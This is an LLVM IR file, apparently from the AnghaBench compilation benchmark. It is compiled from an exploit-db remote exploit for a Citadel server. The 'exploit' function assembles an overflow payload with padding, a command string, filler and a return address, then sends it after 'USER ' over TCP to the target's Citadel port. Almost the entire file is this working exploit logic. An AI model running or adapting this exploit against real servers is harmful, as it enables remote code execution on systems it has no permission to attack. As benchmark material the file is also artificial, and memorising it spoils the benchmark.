; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_437.c_exploit.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_437.c_exploit.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { i32 }
%struct.sockaddr_in = type { %struct.TYPE_3__, i32, i32 }
%struct.TYPE_3__ = type { i32 }
%struct.sockaddr = type { i32 }

@RETADDR = common dso_local global i32 0, align 4
@BUFFER = common dso_local global i32 0, align 4
@COMMAND = common dso_local global i8* null, align 8
@arch = common dso_local global %struct.TYPE_4__* null, align 8
@.str = private unnamed_addr constant [5 x i8] c"AAAA\00", align 1
@.str.1 = private unnamed_addr constant [6 x i8] c"USER \00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [9 x i8] c"socket()\00", align 1
@CITADEL_PORT = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [10 x i8] c"connect()\00", align 1
@.str.5 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @exploit(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca [500 x i8], align 16
  %13 = alloca [8 x i8], align 1
  %14 = alloca [8 x i8], align 1
  %15 = alloca [500 x i8], align 16
  %16 = alloca i32*, align 8
  %17 = alloca i32, align 4
  %18 = alloca %struct.sockaddr_in, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %19 = load i32, i32* @RETADDR, align 4
  %20 = load i32, i32* %6, align 4
  %21 = add nsw i32 %19, %20
  store i32 %21, i32* %17, align 4
  %22 = getelementptr inbounds [500 x i8], [500 x i8]* %12, i64 0, i64 0
  %23 = call i32 @memset(i8* %22, i32 0, i32 500)
  %24 = getelementptr inbounds [500 x i8], [500 x i8]* %15, i64 0, i64 0
  %25 = call i32 @memset(i8* %24, i32 0, i32 500)
  %26 = getelementptr inbounds [8 x i8], [8 x i8]* %14, i64 0, i64 0
  %27 = call i32 @memset(i8* %26, i32 0, i32 8)
  %28 = getelementptr inbounds [8 x i8], [8 x i8]* %13, i64 0, i64 0
  %29 = call i32 @memset(i8* %28, i32 0, i32 8)
  store i32 0, i32* %7, align 4
  br label %30

30:                                               ; preds = %41, %3
  %31 = load i32, i32* %7, align 4
  %32 = load i32, i32* @BUFFER, align 4
  %33 = load i8*, i8** @COMMAND, align 8
  %34 = call i32 @strlen(i8* %33)
  %35 = sub nsw i32 %32, %34
  %36 = icmp slt i32 %31, %35
  br i1 %36, label %37, label %44

37:                                               ; preds = %30
  %38 = load i32, i32* %7, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds [500 x i8], [500 x i8]* %12, i64 0, i64 %39
  store i8 47, i8* %40, align 1
  br label %41

41:                                               ; preds = %37
  %42 = load i32, i32* %7, align 4
  %43 = add nsw i32 %42, 1
  store i32 %43, i32* %7, align 4
  br label %30

44:                                               ; preds = %30
  %45 = getelementptr inbounds [500 x i8], [500 x i8]* %12, i64 0, i64 0
  %46 = load i8*, i8** @COMMAND, align 8
  %47 = call i32 @strcat(i8* %45, i8* %46)
  %48 = getelementptr inbounds [8 x i8], [8 x i8]* %13, i64 0, i64 0
  %49 = bitcast i8* %48 to i32*
  store i32* %49, i32** %16, align 8
  store i32 0, i32* %7, align 4
  br label %50

50:                                               ; preds = %62, %44
  %51 = load i32, i32* %7, align 4
  %52 = icmp slt i32 %51, 4
  br i1 %52, label %53, label %65

53:                                               ; preds = %50
  %54 = load %struct.TYPE_4__*, %struct.TYPE_4__** @arch, align 8
  %55 = load i32, i32* %5, align 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %54, i64 %56
  %58 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %57, i32 0, i32 0
  %59 = load i32, i32* %58, align 4
  %60 = load i32*, i32** %16, align 8
  %61 = getelementptr inbounds i32, i32* %60, i32 1
  store i32* %61, i32** %16, align 8
  store i32 %59, i32* %60, align 4
  br label %62

62:                                               ; preds = %53
  %63 = load i32, i32* %7, align 4
  %64 = add nsw i32 %63, 4
  store i32 %64, i32* %7, align 4
  br label %50

65:                                               ; preds = %50
  %66 = getelementptr inbounds [500 x i8], [500 x i8]* %12, i64 0, i64 0
  %67 = getelementptr inbounds [8 x i8], [8 x i8]* %13, i64 0, i64 0
  %68 = call i32 @strcat(i8* %66, i8* %67)
  %69 = getelementptr inbounds [500 x i8], [500 x i8]* %12, i64 0, i64 0
  %70 = call i32 @strcat(i8* %69, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0))
  %71 = getelementptr inbounds [8 x i8], [8 x i8]* %14, i64 0, i64 0
  %72 = bitcast i8* %71 to i32*
  store i32* %72, i32** %16, align 8
  store i32 0, i32* %7, align 4
  br label %73

73:                                               ; preds = %80, %65
  %74 = load i32, i32* %7, align 4
  %75 = icmp slt i32 %74, 4
  br i1 %75, label %76, label %83

76:                                               ; preds = %73
  %77 = load i32, i32* %17, align 4
  %78 = load i32*, i32** %16, align 8
  %79 = getelementptr inbounds i32, i32* %78, i32 1
  store i32* %79, i32** %16, align 8
  store i32 %77, i32* %78, align 4
  br label %80

80:                                               ; preds = %76
  %81 = load i32, i32* %7, align 4
  %82 = add nsw i32 %81, 4
  store i32 %82, i32* %7, align 4
  br label %73

83:                                               ; preds = %73
  %84 = getelementptr inbounds [500 x i8], [500 x i8]* %12, i64 0, i64 0
  %85 = getelementptr inbounds [8 x i8], [8 x i8]* %14, i64 0, i64 0
  %86 = call i32 @strcat(i8* %84, i8* %85)
  %87 = getelementptr inbounds [500 x i8], [500 x i8]* %15, i64 0, i64 0
  %88 = call i32 @strcpy(i8* %87, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i64 0, i64 0))
  %89 = getelementptr inbounds [500 x i8], [500 x i8]* %15, i64 0, i64 0
  %90 = getelementptr inbounds [500 x i8], [500 x i8]* %12, i64 0, i64 0
  %91 = call i32 @strcat(i8* %89, i8* %90)
  %92 = getelementptr inbounds [500 x i8], [500 x i8]* %15, i64 0, i64 0
  %93 = call i32 @strcat(i8* %92, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  %94 = load i32, i32* @AF_INET, align 4
  %95 = load i32, i32* @SOCK_STREAM, align 4
  %96 = call i32 @socket(i32 %94, i32 %95, i32 0)
  store i32 %96, i32* %8, align 4
  %97 = load i32, i32* %8, align 4
  %98 = icmp eq i32 %97, -1
  br i1 %98, label %99, label %102

99:                                               ; preds = %83
  %100 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0))
  %101 = call i32 @exit(i32 -1) #3
  unreachable

102:                                              ; preds = %83
  %103 = load i32, i32* @AF_INET, align 4
  %104 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  store i32 %103, i32* %104, align 4
  %105 = load i32, i32* @CITADEL_PORT, align 4
  %106 = call i32 @htons(i32 %105)
  %107 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i32 %106, i32* %107, align 4
  %108 = load i8*, i8** %4, align 8
  %109 = call i32 @inet_addr(i8* %108)
  %110 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  %111 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %110, i32 0, i32 0
  store i32 %109, i32* %111, align 4
  %112 = load i32, i32* %8, align 4
  %113 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %114 = call i32 @connect(i32 %112, %struct.sockaddr* %113, i32 12)
  store i32 %114, i32* %9, align 4
  %115 = load i32, i32* %9, align 4
  %116 = icmp eq i32 %115, -1
  br i1 %116, label %117, label %120

117:                                              ; preds = %102
  %118 = call i32 @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.4, i64 0, i64 0))
  %119 = call i32 @exit(i32 -1) #3
  unreachable

120:                                              ; preds = %102
  %121 = load i32, i32* %8, align 4
  %122 = getelementptr inbounds [500 x i8], [500 x i8]* %15, i64 0, i64 0
  %123 = getelementptr inbounds [500 x i8], [500 x i8]* %15, i64 0, i64 0
  %124 = call i32 @strlen(i8* %123)
  %125 = call i32 @write(i32 %121, i8* %122, i32 %124)
  %126 = getelementptr inbounds [500 x i8], [500 x i8]* %15, i64 0, i64 0
  %127 = call i32 @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.5, i64 0, i64 0), i8* %126)
  %128 = load i32, i32* %8, align 4
  %129 = call i32 @close(i32 %128)
  ret void
}

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @printf(i8*, i8*) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
